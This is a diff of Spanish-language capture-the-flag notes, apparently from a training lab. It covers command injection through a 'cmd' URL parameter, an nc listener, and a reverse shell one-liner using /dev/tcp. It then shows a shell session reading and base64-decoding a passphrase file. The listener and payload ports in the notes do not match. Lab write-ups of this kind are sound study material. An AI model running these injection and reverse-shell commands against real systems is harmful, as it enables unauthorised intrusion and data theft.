@@ -62,7 +62,7 @@ Progress: 6453 / 6453 (100.00%)
 
 al poner el parametero : 
 http://10.64.132.198/assets/index.php?cmd=id
-el servidor rsponde con un mensaje en texto plano : 
+el servidor rsponde con un mensaje esn texto plano : 
 dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
 es base64, al decodficiarlo muestra : 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -72,3 +72,55 @@ index.php
 styles.css
 
 intentare poner una reverse shell : 
+
+listener : nc -lvnp 9999
+payload : sh -i >& /dev/tcp/192.168.138.111/9001 0>&1
+
+recibi una respuestaen el listener : 
+
+[davidoberst@archlinux ~]$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.66.169.120 47292
+$ ls
+ls
+images  index.php  styles.css
+$ whoami 
+whoami
+www-data
+$ 
+
+
+encontre una carpeta llamada HIdden Content 
+
+Hidden_Content  html
+$ cd Hidden_COntent
+cd Hidden_COntent
+sh: 11: cd: can't cd to Hidden_COntent
+$ cd Hidden_Content        
+cd Hidden_Content
+$ ls
+ls
+passphrase.txt
+$ cat passphrase.txt
+cat passphrase.txt
+QWxsbWlnaHRGb3JFdmVyISEhCg==
+$     
+
+al decodificar el base64 dice :
+AllmightForEver!!!
+
+luego de buscar en los directorios, encontre la bandera, pero estaba bloqueada :
+
+$ cd home
+cd home
+$ ls
+ls
+deku  ubuntu
+$ cd deku
+cd deku
+$ ls
+ls
+user.txt
+$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
